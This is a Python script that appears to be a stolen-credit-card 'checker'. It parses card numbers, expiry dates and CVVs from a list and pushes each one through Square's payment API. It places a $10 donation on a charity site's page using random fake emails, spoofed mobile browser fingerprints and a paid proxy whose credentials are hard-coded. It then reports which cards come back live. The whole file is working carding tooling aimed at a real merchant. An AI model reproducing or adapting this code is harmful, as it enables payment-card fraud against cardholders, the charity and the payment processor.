import requests, re, random, string, time

#PROXY SET
username = "5jyhut1y7txru6p"
password = "29xsyvbeh91v84q"
proxy = "rp.proxyscrape.com:6060"
proxy_auth = "{}:{}@{}".format(username, password, proxy)
proxies = { "http": "http://{}".format(proxy_auth) }

# RANDOM EMAIL GEN
def email():
	return ''.join(random.choice(string.ascii_lowercase) for x in range(random.randint(7, 15))) + str(
		random.randint(1111, 9999)) + '@gmail.com'
		
# LISTA BREAK
def pregs(lst):
	arrays = re.findall(r'[0-9]+', lst)
	return arrays

def gate(cc_info):
	arrs = pregs(cc_info)
	cc = arrs[0]
	exp_month = str(int(arrs[1]))
	exp_year = arrs[2]
	if exp_month[0] == '0':
		exp_month = exp_month[1:]
	if len(exp_year) == 2:
		exp_year = f"20{exp_year}"
	exp_year = int(exp_year)
	cvc = arrs[3]
	
	
	url_to_get = "https://pci-connect.squareup.com/payments/hydrate?applicationId=sq0idp-T0Hvgi3qhA_ad5CEPIohqg&hostname=norva.club&locationId=LKZ69Y1G8K1XZ&version=1.54.4"
		
	response = requests.get(url_to_get, proxies=proxies)
		
	if response.status_code == 200:
		data = response.json()
		session_id = data.get("sessionId")
				
#SECOND REQUEST
	cookies = {
			'_savt': '0670d3c4-277b-427f-820c-8893357b4fcb',
			'__cf_bm': 'JP0qBsa736gGbMJ9KOfxwLY2tYEsrJiTEf7Z0V5kHc0-1703421843-1-AZKcnG6FQx9Y/c1KBLcyLaaEOGHvTE3AJCLpAOBW83OvIx4l+Dre2rsuBUK6RqzVa7oyE2jWqhLYCMzUDAaszx8=',
		}
		
	headers = {
			'authority': 'connect.squareup.com',
			'accept': '*/*',
			'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
			'content-type': 'application/json',
			'origin': 'https://connect.squareup.com',
			'referer': 'https://connect.squareup.com/payments/data/frame.html?referer=https%3A%2F%2Fnorva.club%2Fhome%2Fdonation%2F',
			'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
			'sec-ch-ua-mobile': '?1',
			'sec-ch-ua-platform': '"Android"',
			'sec-fetch-dest': 'empty',
			'sec-fetch-mode': 'cors',
			'sec-fetch-site': 'same-origin',
			'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
		}
		
	json_data = {
			'components': '{"user_agent":"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36","language":"en-US","color_depth":24,"resolution":[740,360],"available_resolution":[740,360],"timezone_offset":-60,"session_storage":1,"local_storage":1,"open_database":1,"cpu_class":"unknown","navigator_platform":"Linux armv81","do_not_track":"unknown","regular_plugins":[],"adblock":false,"has_lied_languages":false,"has_lied_resolution":false,"has_lied_os":false,"has_lied_browser":false,"touch_support":[5,true,true],"js_fonts":["Arial","Courier","Courier New","Georgia","Helvetica","Monaco","Palatino","Tahoma","Times","Times New Roman","Verdana","Wingdings 2","Wingdings 3"]}',
			'fingerprint': 'ddcb128e9234e88216d8cf4666d2b3b9',
			'timezone': '-60',
			'user_agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
			'version': 'd5fd6b68f21264c14a6aa32a61e8eefe29a68770',
			'website_url': 'https://norva.club/home/donation/',
			'client_id': 'sq0idp-T0Hvgi3qhA_ad5CEPIohqg',
			'browser_fingerprint_by_version': [
				{
					'payload_json': '{"components":{"user_agent":"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36","language":"en-US","color_depth":24,"resolution":[740,360],"available_resolution":[740,360],"timezone_offset":-60,"session_storage":1,"local_storage":1,"open_database":1,"cpu_class":"unknown","navigator_platform":"Linux armv81","do_not_track":"unknown","regular_plugins":[],"adblock":false,"has_lied_languages":false,"has_lied_resolution":false,"has_lied_os":false,"has_lied_browser":false,"touch_support":[5,true,true],"js_fonts":["Arial","Courier","Courier New","Georgia","Helvetica","Monaco","Palatino","Tahoma","Times","Times New Roman","Verdana","Wingdings 2","Wingdings 3"]},"fingerprint":"ddcb128e9234e88216d8cf4666d2b3b9"}',
					'payload_type': 'fingerprint-v1',
				},
				{
					'payload_json': '{"components":{"language":"en-US","color_depth":24,"resolution":[740,360],"available_resolution":[740,360],"timezone_offset":-60,"session_storage":1,"local_storage":1,"open_database":1,"cpu_class":"unknown","navigator_platform":"Linux armv81","do_not_track":"unknown","regular_plugins":[],"adblock":false,"has_lied_languages":false,"has_lied_resolution":false,"has_lied_os":false,"has_lied_browser":false,"touch_support":[5,true,true],"js_fonts":["Arial","Courier","Courier New","Georgia","Helvetica","Monaco","Palatino","Tahoma","Times","Times New Roman","Verdana","Wingdings 2","Wingdings 3"]},"fingerprint":"9713c97ab63c4e0964960e684120fe39"}',
					'payload_type': 'fingerprint-v1-sans-ua',
				},
			],
		}
		
	response = requests.post('https://connect.squareup.com/v2/analytics/token', cookies=cookies, headers=headers, json=json_data)
		
	if response.status_code == 200:
		data = response.json()
		token = data.get("token")
		
		
#Third REQUEST
	cookies = {
			'_savt': '0670d3c4-277b-427f-820c-8893357b4fcb',
			'__cf_bm': 'NdwejkgyVS64sXqzenUHI0mAnK3CB_teYEIoP_F9ZwA-1703418105-1-Ae5jz0WDvgm1wM0BsuHMvXDGM0TysvFeE1Zt8XEEygFflBP4ydTyTNfcBFMDCn6KNn3o5br5FTzFH0j5j89Hmp4=',
		}
		
	headers = {
			'authority': 'pci-connect.squareup.com',
			'accept': 'application/json',
			'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
			'content-type': 'application/json; charset=utf-8',
			'origin': 'https://web.squarecdn.com',
			'referer': 'https://web.squarecdn.com/',
			'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
			'sec-ch-ua-mobile': '?1',
			'sec-ch-ua-platform': '"Android"',
			'sec-fetch-dest': 'empty',
			'sec-fetch-mode': 'cors',
			'sec-fetch-site': 'cross-site',
			'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
		}
		
	params = {
			'_': '1703418193922.6099',
			'version': '1.54.4',
		}
		
	json_data = {
			'client_id': 'sq0idp-T0Hvgi3qhA_ad5CEPIohqg',
			'location_id': 'LKZ69Y1G8K1XZ',
			'payment_method_tracking_id': 'bef0ef9b-e4cf-80b1-fb3a-113e4b06c17b',
			'session_id': session_id,
			'website_url': 'norva.club',
			'analytics_token': token,
			'card_data': {
				'cvv': cvc,
				'exp_month': int(exp_month),
				'exp_year': exp_year,
				'number': cc,
			},
		}
		
	response = requests.post(
			'https://pci-connect.squareup.com/v2/card-nonce',
			params=params,
			cookies=cookies,
			headers=headers,
			json=json_data,
		)
		
	data = response.json()
	cnon = data.get("card_nonce")
		
			
#FORTH REQUEST
	cookies = {
			'_gid': 'GA1.2.434294605.1703356030',
			'_gat_gtag_UA_105816859_1': '1',
			'_ga_NN2453B0HC': 'GS1.1.1703421839.13.1.1703422058.60.0.0',
			'_ga': 'GA1.1.2052567877.1701172513',
			'_ga_E89CJY9YP1': 'GS1.1.1703421839.13.1.1703422058.0.0.0',
		}
		
	headers = {
			'authority': 'norva.club',
			'accept': '*/*',
			'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
			'content-type': 'application/json',
			'origin': 'https://norva.club',
			'referer': 'https://norva.club/home/donation/',
			'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
			'sec-ch-ua-mobile': '?1',
			'sec-ch-ua-platform': '"Android"',
			'sec-fetch-dest': 'empty',
			'sec-fetch-mode': 'cors',
			'sec-fetch-site': 'same-origin',
			'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
		}
		
	json_data = {
			'token': cnon,
			'values': {
				'function': 'donate',
				'first': 'json',
				'last': 'hulker',
				'email': email(),
				'amount': '10',
			},
		}
		
	response = requests.post('https://norva.club/assets/php/process-payment.php', cookies=cookies, headers=headers, json=json_data, proxies=proxies).text

	msg = """"""

	if '{"errors":[{"category":"PAYMENT_METHOD_ERROR","code":"GENERIC_DECLINE","detail":"Authorization error: \'GENERIC_DECLINE\'"}]}' in response:
		msg += (f"{cc_info} GENERIC_DECLINE")
	elif '{"errors":[{"category":"PAYMENT_METHOD_ERROR","code":"CVV_FAILURE","detail":"Authorization error: \'CVV_FAILURE\'"}]}' in response:
		msg += (f"{cc_info} CVV_FAILURE ✅")
	elif '{"errors":[{"category":"PAYMENT_METHOD_ERROR","code":"TRANSACTION_LIMIT","detail":"Authorization error: \'TRANSACTION_LIMIT\'"}]}' in response:
		msg += (f"{cc_info} Not Sufficient Funds ✅")
	else:
		msg += (f"{cc_info} {response}")
	return msg